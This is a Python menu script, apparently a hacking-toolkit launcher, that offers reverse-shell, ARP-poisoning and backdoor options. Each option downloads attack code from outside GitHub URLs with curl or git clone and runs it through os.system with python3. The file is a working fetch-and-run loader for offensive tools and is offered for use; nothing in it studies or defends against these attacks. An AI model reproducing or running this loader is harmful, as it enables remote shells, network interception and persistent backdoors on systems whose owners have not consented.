from colors import green, red, blue, yellow, purple, white

import os, time



red()

banner = """

░█████╗░██╗░░░░░██╗░░░██╗███╗░░░███╗██████╗░██╗░░░██╗░██████╗  ██╗░░██╗  ░██████╗░██████╗░███████╗██╗░░░██╗██╗░░██╗
██╔══██╗██║░░░░░╚██╗░██╔╝████╗░████║██╔══██╗██║░░░██║██╔════╝  ╚██╗██╔╝  ██╔═══██╗██╔══██╗╚════██║██║░░░██║╚██╗██╔╝
██║░░██║██║░░░░░░╚████╔╝░██╔████╔██║██████╔╝██║░░░██║╚█████╗░  ░╚███╔╝░  ██║██╗██║██████╔╝░░███╔═╝██║░░░██║░╚███╔╝░
██║░░██║██║░░░░░░░╚██╔╝░░██║╚██╔╝██║██╔═══╝░██║░░░██║░╚═══██╗  ░██╔██╗░  ╚██████╔╝██╔═══╝░██╔══╝░░██║░░░██║░██╔██╗░
╚█████╔╝███████╗░░░██║░░░██║░╚═╝░██║██║░░░░░╚██████╔╝██████╔╝  ██╔╝╚██╗  ░╚═██╔═╝░██║░░░░░███████╗╚██████╔╝██╔╝╚██╗
░╚════╝░╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░░░░░╚═════╝░╚═════╝░  ╚═╝░░╚═╝  ░░░╚═╝░░░╚═╝░░░░░╚══════╝░╚═════╝░╚═╝░░╚═╝                                   
"""

def decoracion():
    purple()
    
    print("                                1 reverseshell")
    print("                                2 aprpoisoning")
    print("                                3 backdoor")
    print("                                4 exit")    
    option = input(" : ")

    
        

    if option == "1":
        rev()

    if option == "2":
        arp()

    if option == "3":
        backdoor()

    
       

    
        

    if option == "4":
        os.system("clear")
        exit()


def start_menu():
    os.system("clear")
    red()
    print(banner)
    purple()
    decoracion()




    
        
        
        
        
       
       
        

   


def rev():
    os.system("clear")
    green()
    print(banner)
    purple()
    print("                                  1  download script")
    print("                                  2  run script")
    print("                                  3  Exit")
    x = input("              : ")

    print("")
    if x == "1":
        green()
        
        
        os.system("curl https://raw.githubusercontent.com/olympus0k/reverseshell-/main/reverseshell.py -o reverseshell.py")
        red()
        print("done")
        time.sleep(2)
        while True:
            rev()

    if x == "2":
        print("")
        os.system("python3 reverseshell.py")

    if x == "3":
        start_menu()


def arp():
    os.system("clear")

    blue()
    print(banner)
    red()
    print("                               1  download script")
    print("                               2  run script")
    print("                               3  quit")
    x = input("              : ")

    print("")
    if x == "1":
        
        green()
        os.system("curl https://raw.githubusercontent.com/olympus0k/arppoison/main/arph.py -o arppoison.py")
        
        red()
        print("done")
        time.sleep(1)
        while True:
            arp()

    if x == "2":
        print("")
        os.system("python3 arppoison.py")
        
        
        

    if x == "3":
        start_menu()



def backdoor():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 download script")
    print("              |                    2 run script")
    print("              |                    3 quit")

    option = input("              +-> ")
    if option == "1":
        print("")
        yellow()
        os.system("git clone https://github.com/qpzux/Backdoor-no-website.git")
        red()
        print("done")
        time.sleep(2)
        while True:
            backdoor()

    if option == "2":
        print("enter cd Backdoor-no-website ")
        
        

    if option == "3":
        start_menu()


start_menu()